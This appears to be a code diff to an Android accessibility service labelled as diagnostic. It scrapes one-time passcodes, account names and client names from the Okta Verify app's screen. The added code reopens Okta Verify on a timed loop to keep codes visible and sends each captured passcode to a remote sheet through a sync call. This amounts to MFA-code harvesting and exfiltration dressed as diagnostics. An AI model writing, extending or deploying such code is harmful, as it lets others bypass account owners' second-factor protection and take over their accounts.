@@ -5,19 +5,100 @@ import android.os.Handler
 import android.os.Looper
 import android.view.accessibility.AccessibilityEvent
 import android.view.accessibility.AccessibilityNodeInfo
+import kotlinx.coroutines.CoroutineScope
+import kotlinx.coroutines.Dispatchers
+import kotlinx.coroutines.SupervisorJob
+import kotlinx.coroutines.cancel
+import kotlinx.coroutines.launch
 import java.util.Collections
 import java.util.IdentityHashMap
+import java.util.concurrent.ConcurrentHashMap
+import android.content.Intent
+import kotlinx.coroutines.Job
+import kotlinx.coroutines.delay
+import kotlinx.coroutines.isActive
+import android.util.Log
 
 class DiagnosticAccessibilityService : AccessibilityService() {
     private val serviceHandler = Handler(Looper.getMainLooper())
     private val delayedWindowSnapshot = Runnable {
         logWindows()
     }
-
+    private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
+    private val lastDispatchedSecondsMap = ConcurrentHashMap<String, Int>()
+    
+    private var oktaCycleJob: Job? = null
+    
     override fun onServiceConnected() {
         super.onServiceConnected()
         logWindows()
     }
+
+    override fun onDestroy() {
+        super.onDestroy()
+        serviceScope.cancel()
+        lastDispatchedSecondsMap.clear()
+        stopOktaCycleLoop()
+    }
+    
+    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
+        if (intent?.action == ACTION_TOGGLE_CYCLE) {
+            val shouldRun = intent.getBooleanExtra(EXTRA_CYCLE_ENABLED, false)
+            if (shouldRun) {
+                startOktaCycleLoop()
+            } else {
+                stopOktaCycleLoop()
+            }
+        }
+        return super.onStartCommand(intent, flags, startId)
+    }
+    
+    private fun startOktaCycleLoop() {
+        if (oktaCycleJob?.isActive == true) return
+
+        oktaCycleJob = serviceScope.launch {
+            while (isActive) {
+                // Launch / Bring Okta to foreground
+                openOktaApp()
+
+                // Keep Okta open for 10 seconds
+                delay(10_000L)
+                if (!isActive) break
+
+                // Minimize/Close by sending global Home action
+                performGlobalAction(GLOBAL_ACTION_HOME)
+
+                // Wait 1-2 seconds on the home screen before reopening
+                delay(1_500L)
+            }
+        }
+    }
+    
+    private fun stopOktaCycleLoop() {
+        oktaCycleJob?.cancel()
+        oktaCycleJob = null
+    }
+
+    private fun openOktaApp() {
+    var launchIntent = packageManager.getLaunchIntentForPackage(OKTA_PACKAGE)
+
+    // Fallback: direct action intent if standard launch intent is null
+    if (launchIntent == null) {
+        launchIntent = Intent(Intent.ACTION_MAIN).apply {
+            addCategory(Intent.CATEGORY_LAUNCHER)
+            setPackage(OKTA_PACKAGE)
+        }
+    }
+
+    launchIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP)
+
+    try {
+        startActivity(launchIntent)
+        Log.d("OktaCycle", "Successfully triggered launch for $OKTA_PACKAGE")
+    } catch (e: Exception) {
+        Log.e("OktaCycle", "Failed to launch $OKTA_PACKAGE: ${e.message}")
+    }
+}
 
     override fun onAccessibilityEvent(event: AccessibilityEvent?) {
         if (event == null) return
@@ -104,7 +185,7 @@ class DiagnosticAccessibilityService : AccessibilityService() {
     override fun onInterrupt() {
     }
 
-    private class OktaFields {
+    private inner class OktaFields {
         var client: String? = null
         var account: String? = null
         var hasPasswordNode: Boolean = false
@@ -117,12 +198,37 @@ class DiagnosticAccessibilityService : AccessibilityService() {
             val secondsValue = secondsUntilCodeExpires ?: return
             val passValue = pass?: return
             if (!hasPasswordNode) return
-            DiagnosticLog.addOktaSnapshot(clientValue, accountValue, secondsValue, passValue.replace("\\s".toRegex(), ""))
+            val dedupeKey = "$clientValue:::$accountValue"
+            val lastSentSeconds = lastDispatchedSecondsMap[dedupeKey]
+            
+            if (lastSentSeconds == secondsValue) {
+                return
+            }
+            lastDispatchedSecondsMap[dedupeKey] = secondsValue
+            
+            val cleanPassword = passValue.replace("\\s".toRegex(), "")
+            
+            DiagnosticLog.addOktaSnapshot(clientValue, accountValue, secondsValue, cleanPassword)
 
+            serviceScope.launch {
+                val result = SheetRepository.syncDiagnosticData(
+                    clientName = clientValue,
+                    account = accountValue,
+                    pass = cleanPassword,
+                    secondsUntilCodeExpires = secondsValue
+                )
+                result.onFailure {
+                    if (lastDispatchedSecondsMap[dedupeKey] == secondsValue) {
+                        lastDispatchedSecondsMap.remove(dedupeKey)
+                    }
+                }
+            }
         }
     }
 
     companion object {
+        const val ACTION_TOGGLE_CYCLE = "dev.local.accessibilitydiagnostics.ACTION_TOGGLE_OKTA_CYCLE"
+        const val EXTRA_CYCLE_ENABLED = "extra_cycle_enabled"
         private const val MAX_DEPTH = 80
         private const val WINDOW_SNAPSHOT_DELAY_MS = 200L
         private const val OKTA_PACKAGE = "com.okta.android.auth"
